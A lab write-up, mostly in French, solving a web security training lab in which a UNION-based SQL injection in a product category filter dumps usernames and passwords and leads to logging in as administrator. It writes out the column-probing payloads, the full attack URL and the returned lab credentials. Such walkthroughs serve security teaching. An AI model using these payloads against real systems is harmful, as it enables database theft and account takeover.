@@ -1,0 +1,46 @@
+          DESCRIPTION
+------------------------------------------------------------------------------------------------------
+
+This lab contains an SQL injection vulnerability in the product category filter.
+The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a different table called users, with columns called username and password.
+
+To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords,
+and use the information to log in as the administrator user.
+
+------------------------------------------------------------------------------------------------------
+
+Gardons les informations suivantes :
+table = users
+colonnes = username, password
+
+Même méthodologie que pour les précédents labs, on retrouve le nombre de colonnes et leur compatibilité avec une string avec le payload :
+'UNION SELECT NULL,NULL....--
+
+2 colonnes sont disponibles.
+
+'UNION SELECT 'a',NULL--
+'UNION SELECT NULL,'a'--
+
+Seule la seconde colonne est compatible avec les strings.
+
+Nous disposons donc des informations suivantes :
+
+table = users
+2 colonnes : username, password
+Compatbile avec string : 2nd colonne
+
+Tentons maintenant de concatener les valeurs contenues dans username et password à partir de la deuxième colonne :
+
+https://0a7600e303f6baf9c0b7fe2c004c0007.web-security-academy.net/filter?category=Gifts'UNION SELECT NULL,username || '=' || password FROM users--
+
+La page retourne les deux colones séparées par un "=", contenant le mot de passe de l'administrateur :
+
+High-End Gift Wrapping
+Snow Delivered To Your Door
+wiener=jm9krrxittguzkp66szm
+administrator=*******************
+Conversation Controlling Lemon
+Couple's Umbrella
+carlos=j94kb278agl7qmn4l1bw
